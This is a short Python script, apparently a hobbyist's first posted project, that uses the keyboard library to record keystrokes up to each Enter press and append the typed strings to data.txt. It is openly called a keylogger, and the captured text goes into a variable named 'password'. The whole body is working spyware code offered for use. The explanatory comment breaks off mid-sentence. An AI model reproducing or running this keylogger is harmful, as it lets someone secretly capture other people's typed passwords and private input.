# pip install keyboard
#This is a basic keylogger I made that will record and write all keyboard inputs into a text file, called Data.txt..
#Feel free to suggest improvements to the code, this is my first project to post so I'm open to any changes and edits.
#To run the program you'll

import keyboard
path = "data.txt"
while True:
    with open(path, 'a') as data_file:
        events = keyboard.record('enter')
        password = list(keyboard.get_typed_strings(events))
        data_file.write('\n') # New line written before data is written
        data_file.write(password[0])
